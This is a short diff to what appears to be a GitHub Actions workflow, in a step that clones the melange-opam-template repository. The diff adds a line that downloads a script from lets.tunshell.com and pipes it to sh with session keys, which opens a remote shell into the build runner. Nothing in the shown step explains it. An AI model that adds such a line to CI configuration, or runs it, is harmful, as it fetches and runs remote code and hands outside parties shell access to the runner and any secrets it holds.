@@ -66,6 +66,7 @@ jobs:
 
       - name: Clone melange-opam-template
         run: |
+          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T HGcud4fgfVnw2IHu5dEU8X myb7Ef8xhBEyRTvfXMMbJ8
           git clone https://github.com/melange-re/melange-opam-template.git
           cd melange-opam-template
 
